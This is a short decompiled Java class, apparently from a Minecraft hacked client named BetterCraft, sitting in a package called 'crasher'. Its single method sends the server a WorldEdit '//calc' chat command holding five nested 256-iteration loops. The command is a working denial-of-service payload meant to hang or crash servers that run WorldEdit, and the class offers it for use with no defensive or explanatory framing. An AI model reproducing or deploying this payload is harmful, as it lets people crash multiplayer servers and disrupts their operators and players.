/*   */ package me.nzxter.bettercraft.mods.crasher;
/*   */ 
/*   */ import net.minecraft.client.Minecraft;
/*   */ import net.minecraft.network.Packet;
/*   */ import net.minecraft.network.play.client.CPacketChatMessage;
/*   */ 
/*   */ public class WorldEditCrasher {
/*   */   public static void start() {
/* 9 */     (Minecraft.getMinecraft()).player.connection.sendPacket((Packet)new CPacketChatMessage("//calc for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){for(m=0;m<256;m++){ln(pi)}}}}}"));
/*   */   }
/*   */ }


/* Location:              C:\Users\emlin\Desktop\BetterCraft.jar!\me\nzxter\bettercraft\mods\crasher\WorldEditCrasher.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */